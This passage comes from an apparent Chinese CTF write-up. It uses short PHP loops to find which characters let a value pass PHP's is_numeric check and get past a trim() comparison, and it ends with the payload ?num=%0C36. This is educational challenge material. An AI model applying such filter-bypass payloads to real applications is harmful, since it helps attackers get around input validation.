$x=chr($i).'1';
if(is_numeric($x)==true){
echo urlencode(chr($i))."\n";
}
}
?>
```

这里主要是输出 循环ascii后 在1前面加上字符后 是否能够识别为数字 如果可以输出字符

```cobol
%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9 
```

发现这些字符可以绕过 is_numeric函数

那么我们再加上条件 trim()

```php
<?php
for($i=0;$i<128;$i++){
$x=chr($i).'1';
if(is_numeric($x)==true and trim($x)!=="1"){
echo urlencode(chr($i))."\n";
}
}
?>
```

```cobol
%0C %2B - . 0 1 2 3 4 5 6 7 8 9 
 
 
%2b是 +
```

对比一下 filter 发现只有 %0c可以绕过

所以payload就出现了

```cobol
?num=%0C36
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/958a5437313d34a2e13bb62062f53382.png" alt="" style="max-height:66px; box-sizing:content-box;" />


##